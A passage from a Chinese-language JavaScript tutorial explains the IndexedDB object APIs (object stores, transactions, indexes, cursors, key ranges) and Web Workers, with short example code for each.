    > ```
    > var db;
    > var DBOpenRequest = window.indexedDB.open('demo', 1);
    > 
    > DBOpenRequest.onsuccess = function (event) {
    >   db = DBOpenRequest.result;
    >   var transaction = db.transaction(['items'], 'readwrite');
    > 
    >   transaction.oncomplete = function (event) {
    >     console.log('transaction success');
    >   };
    > 
    >   transaction.onerror = function (event) {
    >     console.log('transaction error: ' + transaction.error);
    >   };
    > 
    >   var objectStore = transaction.objectStore('items');
    >   var objectStoreRequest = objectStore.add({ foo: 1 });
    > 
    >   objectStoreRequest.onsuccess = function (event) {
    >     console.log('add data success');
    >   };
    > 
    > };
    > ```
    >
    > **（2）IDBObjectStore.put()**
    >
    > `IDBObjectStore.put()`方法用于更新某个主键对应的数据记录，如果对应的键值不存在，则插入一条新的记录。该方法返回一个 IDBRequest 对象。
    >
    > ```
    > objectStore.put(item, key)
    > ```
    >
    > 该方法接受两个参数，第一个参数为新数据，第二个参数为主键，该参数可选，且只在自动递增时才有必要提供，因为那时主键不包含在数据值里面。
    >
    > **（3）IDBObjectStore.clear()**
    >
    > `IDBObjectStore.clear()`删除当前对象仓库的所有记录。该方法返回一个 IDBRequest 对象。
    >
    > ```
    > objectStore.clear()
    > ```
    >
    > 该方法不需要参数。
    >
    > **（4）IDBObjectStore.delete()**
    >
    > `IDBObjectStore.delete()`方法用于删除指定主键的记录。该方法返回一个 IDBRequest 对象。
    >
    > ```
    > objectStore.delete(Key)
    > ```
    >
    > 该方法的参数为主键的值。
    >
    > **（5）IDBObjectStore.count()**
    >
    > `IDBObjectStore.count()`方法用于计算记录的数量。该方法返回一个 IDBRequest 对象。
    >
    > ```
    > IDBObjectStore.count(key)
    > ```
    >
    > 不带参数时，该方法返回当前对象仓库的所有记录数量。如果主键或 IDBKeyRange 对象作为参数，则返回对应的记录数量。
    >
    > **（6）IDBObjectStore.getKey()**
    >
    > `IDBObjectStore.getKey()`用于获取主键。该方法返回一个 IDBRequest 对象。
    >
    > ```
    > objectStore.getKey(key)
    > ```
    >
    > 该方法的参数可以是主键值或 IDBKeyRange 对象。
    >
    > **（7）IDBObjectStore.get()**
    >
    > `IDBObjectStore.get()`用于获取主键对应的数据记录。该方法返回一个 IDBRequest 对象。
    >
    > ```
    > objectStore.get(key)
    > ```
    >
    > **（8）IDBObjectStore.getAll()**
    >
    > `DBObjectStore.getAll()`用于获取对象仓库的记录。该方法返回一个 IDBRequest 对象。
    >
    > ```
    > // 获取所有记录
    > objectStore.getAll()
    > 
    > // 获取所有符合指定主键或 IDBKeyRange 的记录
    > objectStore.getAll(query)
    > 
    > // 指定获取记录的数量
    > objectStore.getAll(query, count)
    > ```
    >
    > **（9）IDBObjectStore.getAllKeys()**
    >
    > `IDBObjectStore.getAllKeys()`用于获取所有符合条件的主键。该方法返回一个 IDBRequest 对象。
    >
    > ```
    > // 获取所有记录的主键
    > objectStore.getAllKeys()
    > 
    > // 获取所有符合条件的主键
    > objectStore.getAllKeys(query)
    > 
    > // 指定获取主键的数量
    > objectStore.getAllKeys(query, count)
    > ```
    >
    > **（10）IDBObjectStore.index()**
    >
    > `IDBObjectStore.index()`方法返回指定名称的索引对象 IDBIndex。
    >
    > ```
    > objectStore.index(name)
    > ```
    >
    > 有了索引以后，就可以针对索引所在的属性读取数据。
    >
    > ```
    > var t = db.transaction(['people'], 'readonly');
    > var store = t.objectStore('people');
    > var index = store.index('name');
    > 
    > var request = index.get('foo');
    > ```
    >
    > 上面代码打开对象仓库以后，先用`index()`方法指定获取`name`属性的索引，然后用`get()`方法读取某个`name`属性(`foo`)对应的数据。如果`name`属性不是对应唯一值，这时`get()`方法有可能取回多个数据对象。另外，`get()`是异步方法，读取成功以后，只能在`success`事件的监听函数中处理数据。
    >
    > **（11）IDBObjectStore.createIndex()**
    >
    > `IDBObjectStore.createIndex()`方法用于新建当前数据库的一个索引。该方法只能在`VersionChange`监听函数里面调用。
    >
    > ```
    > objectStore.createIndex(indexName, keyPath, objectParameters)
    > ```
    >
    > 该方法可以接受三个参数。
    >
    > - indexName：索引名
    > - keyPath：主键
    > - objectParameters：配置对象（可选）
    >
    > 第三个参数可以配置以下属性。
    >
    > - unique：如果设为`true`，将不允许重复的值
    > - multiEntry：如果设为`true`，对于有多个值的主键数组，每个值将在索引里面新建一个条目，否则主键数组对应一个条目。
    >
    > 假定对象仓库中的数据记录都是如下的`person`类型。
    >
    > ```
    > var person = {
    >   name: name,
    >   email: email,
    >   created: new Date()
    > };
    > ```
    >
    > 可以指定这个对象的某个属性来建立索引。
    >
    > ```
    > var store = db.createObjectStore('people', { autoIncrement: true });
    > 
    > store.createIndex('name', 'name', { unique: false });
    > store.createIndex('email', 'email', { unique: true });
    > ```
    >
    > 上面代码告诉索引对象，`name`属性不是唯一值，`email`属性是唯一值。
    >
    > **（12）IDBObjectStore.deleteIndex()**
    >
    > `IDBObjectStore.deleteIndex()`方法用于删除指定的索引。该方法只能在`VersionChange`监听函数里面调用。
    >
    > ```
    > objectStore.deleteIndex(indexName)
    > ```
    >
    > **（13）IDBObjectStore.openCursor()**
    >
    > `IDBObjectStore.openCursor()`用于获取一个指针对象。
    >
    > ```
    > IDBObjectStore.openCursor()
    > ```
    >
    > 指针对象可以用来遍历数据。该对象也是异步的，有自己的`success`和`error`事件，可以对它们指定监听函数。
    >
    > ```
    > var t = db.transaction(['test'], 'readonly');
    > var store = t.objectStore('test');
    > 
    > var cursor = store.openCursor();
    > 
    > cursor.onsuccess = function (event) {
    >   var res = event.target.result;
    >   if (res) {
    >     console.log('Key', res.key);
    >     console.dir('Data', res.value);
    >     res.continue();
    >   }
    > }
    > ```
    >
    > 监听函数接受一个事件对象作为参数，该对象的`target.result`属性指向当前数据记录。该记录的`key`和`value`分别返回主键和键值（即实际存入的数据）。`continue()`方法将光标移到下一个数据对象，如果当前数据对象已经是最后一个数据了，则光标指向`null`。
    >
    > `openCursor()`方法的第一个参数是主键值，或者一个 IDBKeyRange 对象。如果指定该参数，将只处理包含指定主键的记录；如果省略，将处理所有的记录。该方法还可以接受第二个参数，表示遍历方向，默认值为`next`，其他可能的值为`prev`、`nextunique`和`prevunique`。后两个值表示如果遇到重复值，会自动跳过。
    >
    > **（14）IDBObjectStore.openKeyCursor()**
    >
    > `IDBObjectStore.openKeyCursor()`用于获取一个主键指针对象。
    >
    > ```
    > IDBObjectStore.openKeyCursor()
    > ```
    >
    > ## IDBTransaction 对象
    >
    > IDBTransaction 对象用来异步操作数据库事务，所有的读写操作都要通过这个对象进行。
    >
    > `IDBDatabase.transaction()`方法返回的就是一个 IDBTransaction 对象。
    >
    > ```
    > var db;
    > var DBOpenRequest = window.indexedDB.open('demo', 1);
    > 
    > DBOpenRequest.onsuccess = function(event) {
    >   db = DBOpenRequest.result;
    >   var transaction = db.transaction(['demo'], 'readwrite');
    > 
    >   transaction.oncomplete = function (event) {
    >     console.log('transaction success');
    >   };
    > 
    >   transaction.onerror = function (event) {
    >     console.log('transaction error: ' + transaction.error);
    >   };
    > 
    >   var objectStore = transaction.objectStore('demo');
    >   var objectStoreRequest = objectStore.add({ foo: 1 });
    > 
    >   objectStoreRequest.onsuccess = function (event) {
    >     console.log('add data success');
    >   };
    > 
    > };
    > ```
    >
    > 事务的执行顺序是按照创建的顺序，而不是发出请求的顺序。
    >
    > ```
    > var trans1 = db.transaction('foo', 'readwrite');
    > var trans2 = db.transaction('foo', 'readwrite');
    > var objectStore2 = trans2.objectStore('foo')
    > var objectStore1 = trans1.objectStore('foo')
    > objectStore2.put('2', 'key');
    > objectStore1.put('1', 'key');
    > ```
    >
    > 上面代码中，`key`对应的键值最终是`2`，而不是`1`。因为事务`trans1`先于`trans2`创建，所以首先执行。
    >
    > 注意，事务有可能失败，只有监听到事务的`complete`事件，才能保证事务操作成功。
    >
    > IDBTransaction 对象有以下属性。
    >
    > - `IDBTransaction.db`：返回当前事务所在的数据库对象 IDBDatabase。
    > - `IDBTransaction.error`：返回当前事务的错误。如果事务没有结束，或者事务成功结束，或者被手动终止，该方法返回`null`。
    > - `IDBTransaction.mode`：返回当前事务的模式，默认是`readonly`（只读），另一个值是`readwrite`。
    > - `IDBTransaction.objectStoreNames`：返回一个类似数组的对象 DOMStringList，成员是当前事务涉及的对象仓库的名字。
    > - `IDBTransaction.onabort`：指定`abort`事件（事务中断）的监听函数。
    > - `IDBTransaction.oncomplete`：指定`complete`事件（事务成功）的监听函数。
    > - `IDBTransaction.onerror`：指定`error`事件（事务失败）的监听函数。
    >
    > IDBTransaction 对象有以下方法。
    >
    > - `IDBTransaction.abort()`：终止当前事务，回滚所有已经进行的变更。
    > - `IDBTransaction.objectStore(name)`：返回指定名称的对象仓库 IDBObjectStore。
    >
    > ## IDBIndex 对象
    >
    > IDBIndex 对象代表数据库的索引，通过这个对象可以获取数据库里面的记录。数据记录的主键默认就是带有索引，IDBIndex 对象主要用于通过除主键以外的其他键，建立索引获取对象。
    >
    > IDBIndex 是持久性的键值对存储。只要插入、更新或删除数据记录，引用的对象库中的记录，索引就会自动更新。
    >
    > `IDBObjectStore.index()`方法可以获取 IDBIndex 对象。
    >
    > ```
    > var transaction = db.transaction(['contactsList'], 'readonly');
    > var objectStore = transaction.objectStore('contactsList');
    > var myIndex = objectStore.index('lName');
    > 
    > myIndex.openCursor().onsuccess = function (event) {
    >   var cursor = event.target.result;
    >   if (cursor) {
    >     var tableRow = document.createElement('tr');
    >     tableRow.innerHTML =   '<td>' + cursor.value.id + '</td>'
    >                          + '<td>' + cursor.value.lName + '</td>'
    >                          + '<td>' + cursor.value.fName + '</td>'
    >                          + '<td>' + cursor.value.jTitle + '</td>'
    >                          + '<td>' + cursor.value.company + '</td>'
    >                          + '<td>' + cursor.value.eMail + '</td>'
    >                          + '<td>' + cursor.value.phone + '</td>'
    >                          + '<td>' + cursor.value.age + '</td>';
    >     tableEntry.appendChild(tableRow);
    > 
    >     cursor.continue();
    >   } else {
    >     console.log('Entries all displayed.');
    >   }
    > };
    > ```
    >
    > IDBIndex 对象有以下属性。
    >
    > - `IDBIndex.name`：字符串，索引的名称。
    > - `IDBIndex.objectStore`：索引所在的对象仓库。
    > - `IDBIndex.keyPath`：索引的主键。
    > - `IDBIndex.multiEntry`：布尔值，针对`keyPath`为数组的情况，如果设为`true`，创建数组时，每个数组成员都会有一个条目，否则每个数组都只有一个条目。
    > - `IDBIndex.unique`：布尔值，表示创建索引时是否允许相同的主键。
    >
    > IDBIndex 对象有以下方法，它们都是异步的，立即返回的都是一个 IDBRequest 对象。
    >
    > - `IDBIndex.count()`：用来获取记录的数量。它可以接受主键或 IDBKeyRange 对象作为参数，这时只返回符合主键的记录数量，否则返回所有记录的数量。
    > - `IDBIndex.get(key)`：用来获取符合指定主键的数据记录。
    > - `IDBIndex.getKey(key)`：用来获取指定的主键。
    > - `IDBIndex.getAll()`：用来获取所有的数据记录。它可以接受两个参数，都是可选的，第一个参数用来指定主键，第二个参数用来指定返回记录的数量。如果省略这两个参数，则返回所有记录。由于获取成功时，浏览器必须生成所有对象，所以对性能有影响。如果数据集比较大，建议使用 IDBCursor 对象。
    > - `IDBIndex.getAllKeys()`：该方法与`IDBIndex.getAll()`方法相似，区别是获取所有主键。
    > - `IDBIndex.openCursor()`：用来获取一个 IDBCursor 对象，用来遍历索引里面的所有条目。
    > - `IDBIndex.openKeyCursor()`：该方法与`IDBIndex.openCursor()`方法相似，区别是遍历所有条目的主键。
    >
    > ## IDBCursor 对象
    >
    > IDBCursor 对象代表指针对象，用来遍历数据仓库（IDBObjectStore）或索引（IDBIndex）的记录。
    >
    > IDBCursor 对象一般通过`IDBObjectStore.openCursor()`方法获得。
    >
    > ```
    > var transaction = db.transaction(['rushAlbumList'], 'readonly');
    > var objectStore = transaction.objectStore('rushAlbumList');
    > 
    > objectStore.openCursor(null, 'next').onsuccess = function(event) {
    >   var cursor = event.target.result;
    >   if (cursor) {
    >     var listItem = document.createElement('li');
    >     listItem.innerHTML = cursor.value.albumTitle + ', ' + cursor.value.year;
    >     list.appendChild(listItem);
    > 
    >     console.log(cursor.source);
    >     cursor.continue();
    >   } else {
    >     console.log('Entries all displayed.');
    >   }
    > };
    > ```
    >
    > IDBCursor 对象的属性。
    >
    > - `IDBCursor.source`：返回正在遍历的对象仓库或索引。
    > - `IDBCursor.direction`：字符串，表示指针遍历的方向。共有四个可能的值：next（从头开始向后遍历）、nextunique（从头开始向后遍历，重复的值只遍历一次）、prev（从尾部开始向前遍历）、prevunique（从尾部开始向前遍历，重复的值只遍历一次）。该属性通过`IDBObjectStore.openCursor()`方法的第二个参数指定，一旦指定就不能改变了。
    > - `IDBCursor.key`：返回当前记录的主键。
    > - `IDBCursor.value`：返回当前记录的数据值。
    > - `IDBCursor.primaryKey`：返回当前记录的主键。对于数据仓库（objectStore）来说，这个属性等同于 IDBCursor.key；对于索引，IDBCursor.key 返回索引的位置值，该属性返回数据记录的主键。
    >
    > IDBCursor 对象有如下方法。
    >
    > - `IDBCursor.advance(n)`：指针向前移动 n 个位置。
    > - `IDBCursor.continue()`：指针向前移动一个位置。它可以接受一个主键作为参数，这时会跳转到这个主键。
    > - `IDBCursor.continuePrimaryKey()`：该方法需要两个参数，第一个是`key`，第二个是`primaryKey`，将指针移到符合这两个参数的位置。
    > - `IDBCursor.delete()`：用来删除当前位置的记录，返回一个 IDBRequest 对象。该方法不会改变指针的位置。
    > - `IDBCursor.update()`：用来更新当前位置的记录，返回一个 IDBRequest 对象。它的参数是要写入数据库的新的值。
    >
    > ## IDBKeyRange 对象
    >
    > IDBKeyRange 对象代表数据仓库（object store）里面的一组主键。根据这组主键，可以获取数据仓库或索引里面的一组记录。
    >
    > IDBKeyRange 可以只包含一个值，也可以指定上限和下限。它有四个静态方法，用来指定主键的范围。
    >
    > - `IDBKeyRange.lowerBound()`：指定下限。
    > - `IDBKeyRange.upperBound()`：指定上限。
    > - `IDBKeyRange.bound()`：同时指定上下限。
    > - `IDBKeyRange.only()`：指定只包含一个值。
    >
    > 下面是一些代码实例。
    >
    > ```
    > // All keys ≤ x
    > var r1 = IDBKeyRange.upperBound(x);
    > 
    > // All keys < x
    > var r2 = IDBKeyRange.upperBound(x, true);
    > 
    > // All keys ≥ y
    > var r3 = IDBKeyRange.lowerBound(y);
    > 
    > // All keys > y
    > var r4 = IDBKeyRange.lowerBound(y, true);
    > 
    > // All keys ≥ x && ≤ y
    > var r5 = IDBKeyRange.bound(x, y);
    > 
    > // All keys > x &&< y
    > var r6 = IDBKeyRange.bound(x, y, true, true);
    > 
    > // All keys > x && ≤ y
    > var r7 = IDBKeyRange.bound(x, y, true, false);
    > 
    > // All keys ≥ x &&< y
    > var r8 = IDBKeyRange.bound(x, y, false, true);
    > 
    > // The key = z
    > var r9 = IDBKeyRange.only(z);
    > ```
    >
    > `IDBKeyRange.lowerBound()`、`IDBKeyRange.upperBound()`、`IDBKeyRange.bound()`这三个方法默认包括端点值，可以传入一个布尔值，修改这个属性。
    >
    > 与之对应，IDBKeyRange 对象有四个只读属性。
    >
    > - `IDBKeyRange.lower`：返回下限
    > - `IDBKeyRange.lowerOpen`：布尔值，表示下限是否为开区间（即下限是否排除在范围之外）
    > - `IDBKeyRange.upper`：返回上限
    > - `IDBKeyRange.upperOpen`：布尔值，表示上限是否为开区间（即上限是否排除在范围之外）
    >
    > IDBKeyRange 实例对象生成以后，将它作为参数输入 IDBObjectStore 或 IDBIndex 对象的`openCursor()`方法，就可以在所设定的范围内读取数据。
    >
    > ```
    > var t = db.transaction(['people'], 'readonly');
    > var store = t.objectStore('people');
    > var index = store.index('name');
    > 
    > var range = IDBKeyRange.bound('B', 'D');
    > 
    > index.openCursor(range).onsuccess = function (e) {
    >   var cursor = e.target.result;
    >   if (cursor) {
    >     console.log(cursor.key + ':');
    > 
    >     for (var field in cursor.value) {
    >       console.log(cursor.value[field]);
    >     }
    >     cursor.continue();
    >   }
    > }
    > ```
    >
    > IDBKeyRange 有一个实例方法`includes(key)`，返回一个布尔值，表示某个主键是否包含在当前这个主键组之内。
    >
    > ```
    > var keyRangeValue = IDBKeyRange.bound('A', 'K', false, false);
    > 
    > keyRangeValue.includes('F') // true
    > keyRangeValue.includes('W') // false
    > ```

  - Web Worker

    > ## 概述
    >
    > JS 语言采用的是单线程模型，也就是说，所有任务只能在一个线程上完成，一次只能做一件事。前面的任务没做完，后面的任务只能等着。随着电脑计算能力的增强，尤其是多核 CPU 的出现，单线程带来很大的不便，无法充分发挥计算机的计算能力。
    >
    > Web Worker 的作用，就是为 JS 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行。在主线程运行的同时，Worker 线程在后台运行，两者互不干扰。等到 Worker 线程完成计算任务，再把结果返回给主线程。这样的好处是，一些计算密集型或高延迟的任务可以交由 Worker 线程执行，主线程（通常负责 UI 交互）能够保持流畅，不会被阻塞或拖慢。
    >
    > Worker 线程一旦新建成功，就会始终运行，不会被主线程上的活动（比如用户点击按钮、提交表单）打断。这样有利于随时响应主线程的通信。但是，这也造成了 Worker 比较耗费资源，不应该过度使用，而且一旦使用完毕，就应该关闭。
    >
    > Web Worker 有以下几个使用注意点。
    >
    > （1）**同源限制**
    >
    > 分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。
    >
    > （2）**DOM 限制**
    >
    > Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用`document`、`window`、`parent`这些对象。但是，Worker 线程可以使用`navigator`对象和`location`对象。
    >
    > （3）**全局对象限制**
    >
    > Worker 的全局对象`WorkerGlobalScope`，不同于网页的全局对象`Window`，很多接口拿不到。比如，理论上 Worker 线程不能使用`console.log`，因为标准里面没有提到 Worker 的全局对象存在`console`接口，只定义了`Navigator`接口和`Location`接口。不过，浏览器实际上支持 Worker 线程使用`console.log`，保险的做法还是不使用这个方法。
    >
    > （4）**通信联系**
    >
    > Worker 线程和主线程不在同一个上下文环境，它们不能直接通信，必须通过消息完成。
    >
    > （5）**脚本限制**
    >
    > Worker 线程不能执行`alert()`方法和`confirm()`方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。
    >
    > （6）**文件限制**
    >
    > Worker 线程无法读取本地文件，即不能打开本机的文件系统（`file://`），它所加载的脚本，必须来自网络。
    >
    > ## 基本用法
    >
    > ### 主线程
    >
    > 主线程采用`new`命令，调用`Worker()`构造函数，新建一个 Worker 线程。
    >
    > ```
    > var worker = new Worker('work.js');
    > ```
    >
    > `Worker()`构造函数的参数是一个脚本文件，该文件就是 Worker 线程所要执行的任务。由于 Worker 不能读取本地文件，所以这个脚本必须来自网络。如果下载没有成功（比如404错误），Worker 就会默默地失败。
    >
    > 然后，主线程调用`worker.postMessage()`方法，向 Worker 发消息。
    >
    > ```
    > worker.postMessage('Hello World');
    > worker.postMessage({method: 'echo', args: ['Work']});
    > ```
    >
    > `worker.postMessage()`方法的参数，就是主线程传给 Worker 的数据。它可以是各种数据类型，包括二进制数据。
    >
    > 接着，主线程通过`worker.onmessage`指定监听函数，接收子线程发回来的消息。
    >
    > ```
    > worker.onmessage = function (event) {
    >   doSomething(event.data);
    > }
    > 
    > function doSomething() {
    >   // 执行任务
    >   worker.postMessage('Work done!');
    > }
    > ```
    >
    > 上面代码中，事件对象的`data`属性可以获取 Worker 发来的数据。
    >
    > Worker 完成任务以后，主线程就可以把它关掉。
    >
    > ```
    > worker.terminate();
    > ```
    >
    > ### Worker 线程
    >
    > Worker 线程内部需要有一个监听函数，监听`message`事件。
    >
    > ```
    > self.addEventListener('message', function (e) {
    >   self.postMessage('You said: ' + e.data);
    > }, false);
    > ```
    >
    > 上面代码中，`self`代表子线程自身，即子线程的全局对象。因此，等同于下面两种写法。
    >
    > ```
    > // 写法一
    > this.addEventListener('message', function (e) {
    >   this.postMessage('You said: ' + e.data);
    > }, false);
    > 
    > // 写法二
    > addEventListener('message', function (e) {
    >   postMessage('You said: ' + e.data);
    > }, false);
    > ```
    >
    > 除了使用`self.addEventListener()`指定监听函数，也可以使用`self.onmessage`指定。监听函数的参数是一个事件对象，它的`data`属性包含主线程发来的数据。`self.postMessage()`方法用来向主线程发送消息。
    >
    > 根据主线程发来的数据，Worker 线程可以调用不同的方法，下面是一个例子。
    >
    > ```
    > self.addEventListener('message', function (e) {
    >   var data = e.data;
    >   switch (data.cmd) {
    >     case 'start':
    >       self.postMessage('WORKER STARTED: ' + data.msg);
    >       break;
    >     case 'stop':
    >       self.postMessage('WORKER STOPPED: ' + data.msg);
    >       self.close(); // Terminates the worker.
    >       break;
    >     default:
    >       self.postMessage('Unknown command: ' + data.msg);
    >   };
    > }, false);
    > ```
    >
    > 上面代码中，`self.close()`用于在 Worker 内部关闭自身。
    >
    > ### Worker 加载脚本
    >
    > Worker 内部如果要加载其他脚本，有一个专门的方法`importScripts()`。
    >
    > ```
    > importScripts('script1.js');
    > ```
    >
    > 该方法可以同时加载多个脚本。
    >
    > ```
    > importScripts('script1.js', 'script2.js');
    > ```
    >
    > ### 错误处理
    >
    > 主线程可以监听 Worker 是否发生错误。如果发生错误，Worker 会触发主线程的`error`事件。
    >
    > ```
    > worker.onerror = function (event) {
    >   console.log(
    >     'ERROR: Line ', event.lineno, ' in ', event.filename, ': ', event.message
    >   );
    > };
    > 
    > // 或者
    > worker.addEventListener('error', function (event) {
    >   // ...
    > });
    > ```
    >
    > Worker 内部也可以监听`error`事件。
    >
    > ### 关闭 Worker
    >
    > 使用完毕，为了节省系统资源，必须关闭 Worker。
    >
    > ```
    > // 主线程
    > worker.terminate();
    > 
    > // Worker 线程
    > self.close();
    > ```
    >
    > ## 数据通信
    >
    > 前面说过，主线程与 Worker 之间的通信内容，可以是文本，也可以是对象。需要注意的是，这种通信是拷贝关系，即是传值而不是传址，Worker 对通信内容的修改，不会影响到主线程。事实上，浏览器内部的运行机制是，先将通信内容串行化，然后把串行化后的字符串发给 Worker，后者再将它还原。
    >
    > 主线程与 Worker 之间也可以交换二进制数据，比如 File、Blob、ArrayBuffer 等类型，也可以在线程之间发送。下面是一个例子。
    >
    > ```
    > // 主线程
    > var uInt8Array = new Uint8Array(new ArrayBuffer(10));
    > for (var i = 0; i < uInt8Array.length; ++i) {
    >   uInt8Array[i] = i * 2; // [0, 2, 4, 6, 8,...]
    > }
    > worker.postMessage(uInt8Array);
    > 
    > // Worker 线程
    > self.onmessage = function (e) {
    >   var uInt8Array = e.data;
    >   postMessage('Inside worker.js: uInt8Array.toString() = ' + uInt8Array.toString());
    >   postMessage('Inside worker.js: uInt8Array.byteLength = ' + uInt8Array.byteLength);
    > };
    > ```
    >
    > 但是，拷贝方式发送二进制数据，会造成性能问题。比如，主线程向 Worker 发送一个 500MB 文件，默认情况下浏览器会生成一个原文件的拷贝。为了解决这个问题，JS 允许主线程把二进制数据直接转移给子线程，但是一旦转移，主线程就无法再使用这些二进制数据了，这是为了防止出现多个线程同时修改数据的麻烦局面。这种转移数据的方法，叫做[Transferable Objects](http://www.w3.org/html/wg/drafts/html/master/infrastructure.html#transferable-objects)。这使得主线程可以快速把数据交给 Worker，对于影像处理、声音处理、3D 运算等就非常方便了，不会产生性能负担。
    >
    > 如果要直接转移数据的控制权，就要使用下面的写法。
    >
    > ```
    > // Transferable Objects 格式
    > worker.postMessage(arrayBuffer, [arrayBuffer]);
    > 
    > // 例子
    > var ab = new ArrayBuffer(1);
    > worker.postMessage(ab, [ab]);
    > ```
    >
    > ## 同页面的 Web Worker
    >
    > 通常情况下，Worker 载入的是一个单独的 JS 脚本文件，但是也可以载入与主线程在同一个网页的代码。
    >
    > ```
    > <!DOCTYPE html>
    >   <body>
    >     <script id="worker" type="app/worker">
    >       addEventListener('message', function () {
    >         postMessage('some message');
    >       }, false);
    >     </script>
    >   </body>
    > </html>
    > ```
    >
    > 上面是一段嵌入网页的脚本，注意必须指定`<script>`标签的`type`属性是一个浏览器不认识的值，上例是`app/worker`。
    >
    > 然后，读取这一段嵌入页面的脚本，用 Worker 来处理。
    >
    > ```
    > var blob = new Blob([document.querySelector('#worker').textContent]);
    > var url = window.URL.createObjectURL(blob);
    > var worker = new Worker(url);
    > 
    > worker.onmessage = function (e) {
    >   // e.data === 'some message'
    > };
    > ```
    >
    > 上面代码中，先将嵌入网页的脚本代码，转成一个二进制对象，然后为这个二进制对象生成 URL，再让 Worker 加载这个 URL。这样就做到了，主线程和 Worker 的代码都在同一个网页上面。
    >
    > ## 实例：Worker 线程完成轮询
    >
    > 有时，浏览器需要轮询服务器状态，以便第一时间得知状态改变。这个工作可以放在 Worker 里面。
    >
    > ```
    > function createWorker(f) {
    >   var blob = new Blob(['(' + f.toString() + ')()']);
    >   var url = window.URL.createObjectURL(blob);
    >   var worker = new Worker(url);
    >   return worker;
    > }
    > 
    > var pollingWorker = createWorker(function (e) {
    >   var cache;
    > 
    >   function compare(new, old) { ... };
    > 
    >   setInterval(function () {
    >     fetch('/my-api-endpoint').then(function (res) {
    >       var data = res.json();
    > 
    >       if (!compare(data, cache)) {
    >         cache = data;
    >         self.postMessage(data);
    >       }
    >     })
    >   }, 1000)
    > });
    > 
    > pollingWorker.onmessage = function () {
    >   // render data
    > }
    > 
    > pollingWorker.postMessage('init');
    > ```
    >
    > 上面代码中，Worker 每秒钟轮询一次数据，然后跟缓存做比较。如果不一致，就说明服务端有了新的变化，因此就要通知主线程。
    >
    > ## 实例： Worker 新建 Worker
    >
    > Worker 线程内部还能再新建 Worker 线程（目前只有 Firefox 浏览器支持）。下面的例子是将一个计算密集的任务，分配到10个 Worker。
    >
    > 主线程代码如下。
    >
    > ```
    > var worker = new Worker('worker.js');
    > worker.onmessage = function (event) {
    >   document.getElementById('result').textContent = event.data;
    > };
    > ```
    >
    > Worker 线程代码如下。
    >
    > ```
    > // worker.js
    > 
    > // settings
    > var num_workers = 10;
    > var items_per_worker = 1000000;
    > 
    > // start the workers
    > var result = 0;
    > var pending_workers = num_workers;
    > for (var i = 0; i < num_workers; i += 1) {
    >   var worker = new Worker('core.js');
    >   worker.postMessage(i * items_per_worker);
    >   worker.postMessage((i + 1) * items_per_worker);
    >   worker.onmessage = storeResult;
    > }
    > 
    > // handle the results
    > function storeResult(event) {
    >   result += event.data;
    >   pending_workers -= 1;
    >   if (pending_workers <= 0)
    >     postMessage(result); // finished!
    > }
    > ```
    >
    > 上面代码中，Worker 线程内部新建了10个 Worker 线程，并且依次向这10个 Worker 发送消息，告知了计算的起点和终点。计算任务脚本的代码如下。
    >
    > ```
    > // core.js
    > var start;
    > onmessage = getStart;
    > function getStart(event) {
    >   start = event.data;
    >   onmessage = getEnd;
    > }
    > 
    > var end;
    > function getEnd(event) {
    >   end = event.data;
    >   onmessage = null;
    >   work();
    > }
    > 
    > function work() {
    >   var result = 0;
    >   for (var i = start; i < end; i += 1) {
    >     // perform some complex calculation here
    >     result += 1;
    >   }
    >   postMessage(result);
    >   close();
    > }
    > ```
    >
    > ## API
    >
    > ### 主线程
    >
    > 浏览器原生提供`Worker()`构造函数，用来供主线程生成 Worker 线程。
    >
    > ```
    > var myWorker = new Worker(jsUrl, options);
    > ```
    >
    > `Worker()`构造函数，可以接受两个参数。第一个参数是脚本的网址（必须遵守同源政策），该参数是必需的，且只能加载 JS 脚本，否则会报错。第二个参数是配置对象，该对象可选。它的一个作用就是指定 Worker 的名称，用来区分多个 Worker 线程。
    >
    > ```
    > // 主线程
    > var myWorker = new Worker('worker.js', { name : 'myWorker' });
    > 
    > // Worker 线程
    > self.name // myWorker
    > ```
    >
    > `Worker()`构造函数返回一个 Worker 线程对象，用来供主线程操作 Worker。Worker 线程对象的属性和方法如下。
    >
    > - Worker.onerror：指定 error 事件的监听函数。
    > - Worker.onmessage：指定 message 事件的监听函数，发送过来的数据在`Event.data`属性中。
    > - Worker.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。
    > - Worker.postMessage()：向 Worker 线程发送消息。
    > - Worker.terminate()：立即终止 Worker 线程。
    >
    > ### Worker 线程
    >
    > Web Worker 有自己的全局对象，不是主线程的`window`，而是一个专门为 Worker 定制的全局对象。因此定义在`window`上面的对象和方法不是全部都可以使用。
    >
    > Worker 线程有一些自己的全局属性和方法。
    >
    > - self.name： Worker 的名字。该属性只读，由构造函数指定。
    > - self.onmessage：指定`message`事件的监听函数。
    > - self.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。
    > - self.close()：关闭 Worker 线程。
    > - self.postMessage()：向产生这个 Worker 的线程发送消息。
    > - self.importScripts()：加载 JS 脚本。

